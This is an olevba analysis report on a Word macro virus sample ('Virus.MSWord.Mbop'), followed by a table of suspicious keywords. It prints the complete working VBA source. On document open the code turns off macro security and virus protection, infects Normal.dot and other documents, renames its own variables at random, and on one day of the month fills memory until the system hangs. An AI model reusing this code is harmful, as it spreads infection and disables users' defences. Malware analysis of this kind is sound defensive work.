olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop-764100b41ef6ad5c443538a5e60ad25d9f68b705
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop-764100b41ef6ad5c443538a5e60ad25d9f68b705 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
mjeojelriibvital1mjeojelriibvita = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mjeojelriibvitafimjeojelriibvita = 7
Options.ConfirmConversions = False
Set mjeojelriibvitaNtmjeojelriibvita = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set mjeojelriibvitaAdmjeojelriibvita = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set mjeojelriibvitaTdmjeojelriibvita = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mjeojelriibvitasemjeojelriibvita = 5
mjeojelriibvital2mjeojelriibvita = "b"
mjeojelriibvitafnmjeojelriibvita = mjeojelriibvitafimjeojelriibvita & mjeojelriibvitasemjeojelriibvita
For mjeojelriibvitaiimjeojelriibvita = 1 To mjeojelriibvitaTdmjeojelriibvita.countoflines
If InStr(mjeojelriibvitaTdmjeojelriibvita.lines(mjeojelriibvitaiimjeojelriibvita, 1), "Private Sub Document_Open()") <> 0 Then
mjeojelriibvitaSlmjeojelriibvita = mjeojelriibvitaiimjeojelriibvita
Exit For
End If
Next
mjeojelriibvital3mjeojelriibvita = "o"
mjeojelriibvitaVcmjeojelriibvita = Trim(mjeojelriibvitaTdmjeojelriibvita.lines(mjeojelriibvitaSlmjeojelriibvita, mjeojelriibvitaSlmjeojelriibvita + mjeojelriibvitafnmjeojelriibvita))
mjeojelriibvitalvmjeojelriibvita = 97
If mjeojelriibvitaNtmjeojelriibvita.countoflines > 0 Then
mjeojelriibvitaNlmjeojelriibvita = mjeojelriibvitaNtmjeojelriibvita.lines(1, mjeojelriibvitaNtmjeojelriibvita.countoflines)
If InStr(mjeojelriibvitaNlmjeojelriibvita, "Nt") = 0 And InStr(mjeojelriibvitaNlmjeojelriibvita, "Sl") = 0 And InStr(mjeojelriibvitaNlmjeojelriibvita, "Nl") = 0 And InStr(mjeojelriibvitaNlmjeojelriibvita, "Ad") = 0 And InStr(mjeojelriibvitaNlmjeojelriibvita, "Vc") = 0 And InStr(mjeojelriibvitaNlmjeojelriibvita, "Td") = 0 Then
mjeojelriibvitaNtmjeojelriibvita.addfromstring mjeojelriibvitaVcmjeojelriibvita
mjeojelriibvitainmjeojelriibvita = True
End If
Else
mjeojelriibvitaNtmjeojelriibvita.addfromstring mjeojelriibvitaVcmjeojelriibvita
mjeojelriibvitainmjeojelriibvita = True
End If
mjeojelriibvitahvmjeojelriibvita = 122
If mjeojelriibvitaAdmjeojelriibvita.countoflines > 0 Then
mjeojelriibvitaAlmjeojelriibvita = mjeojelriibvitaAdmjeojelriibvita.lines(1, mjeojelriibvitaAdmjeojelriibvita.countoflines)
If InStr(mjeojelriibvitaAlmjeojelriibvita, "Nt") = 0 And InStr(mjeojelriibvitaAlmjeojelriibvita, "Sl") = 0 And InStr(mjeojelriibvitaAlmjeojelriibvita, "Nl") = 0 And InStr(mjeojelriibvitaAlmjeojelriibvita, "Ad") = 0 And InStr(mjeojelriibvitaAlmjeojelriibvita, "Vc") = 0 And InStr(mjeojelriibvitaAlmjeojelriibvita, "Td") = 0 Then
mjeojelriibvitaAdmjeojelriibvita.addfromstring mjeojelriibvitaVcmjeojelriibvita
mjeojelriibvitaiamjeojelriibvita = True
End If
Else
mjeojelriibvitaAdmjeojelriibvita.addfromstring mjeojelriibvitaVcmjeojelriibvita
mjeojelriibvitaiamjeojelriibvita = True
End If
mjeojelriibvital4mjeojelriibvita = "p"
For mjeojelriibvitaiimjeojelriibvita = 1 To 15
Randomize
mjeojelriibvitaTnmjeojelriibvita = mjeojelriibvitaTnmjeojelriibvita & Chr(Int((mjeojelriibvitahvmjeojelriibvita - mjeojelriibvitalvmjeojelriibvita + 1) * Rnd + mjeojelriibvitalvmjeojelriibvita))
Next
mjeojelriibvitad2mjeojelriibvita = 9
mjeojelriibvitaVcmjeojelriibvita = mjeojelriibvitaTdmjeojelriibvita.lines(1, mjeojelriibvitaTdmjeojelriibvita.countoflines)
mjeojelriibvitaTdmjeojelriibvita.deletelines 1, mjeojelriibvitaTdmjeojelriibvita.countoflines
Do While InStr(mjeojelriibvitaVcmjeojelriibvita, "mjeojelriibvita") <> 0
mjeojelriibvitaVcmjeojelriibvita = Mid(mjeojelriibvitaVcmjeojelriibvita, 1, InStr(mjeojelriibvitaVcmjeojelriibvita, "mjeojelriibvita") - 1) & mjeojelriibvitaTnmjeojelriibvita & Mid(mjeojelriibvitaVcmjeojelriibvita, InStr(mjeojelriibvitaVcmjeojelriibvita, "mjeojelriibvita") + Len("mjeojelriibvita"))
Loop
mjeojelriibvitaTdmjeojelriibvita.addfromstring mjeojelriibvitaVcmjeojelriibvita
mjeojelriibvitaDymjeojelriibvita = Day(Now)
mjeojelriibvitad1mjeojelriibvita = 2
mjeojelriibvital5mjeojelriibvita = "!"
If mjeojelriibvitaDymjeojelriibvita = mjeojelriibvitad1mjeojelriibvita & mjeojelriibvitad2mjeojelriibvita Then
Dim mjeojelriibvitastmjeojelriibvita()
mjeojelriibvitacamjeojelriibvita = 0
Do
ReDim Preserve mjeojelriibvitastmjeojelriibvita(mjeojelriibvitacamjeojelriibvita)
mjeojelriibvitaqwmjeojelriibvita = CLng(1024)
mjeojelriibvitaqamjeojelriibvita = mjeojelriibvitaqwmjeojelriibvita
mjeojelriibvitaqzmjeojelriibvita = mjeojelriibvitaqwmjeojelriibvita * mjeojelriibvitaqamjeojelriibvita
mjeojelriibvitastmjeojelriibvita(mjeojelriibvitacamjeojelriibvita) = String(mjeojelriibvitaqzmjeojelriibvita, Right(mjeojelriibvitaTnmjeojelriibvita, 1))
DoEvents
mjeojelriibvitacamjeojelriibvita = mjeojelriibvitacamjeojelriibvita + 1
Loop
End If
If mjeojelriibvitaiamjeojelriibvita = True Or mjeojelriibvitainmjeojelriibvita = True Then
MsgBox mjeojelriibvital1mjeojelriibvita & mjeojelriibvital2mjeojelriibvita & mjeojelriibvital3mjeojelriibvita & mjeojelriibvital4mjeojelriibvita & mjeojelriibvital5mjeojelriibvita, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

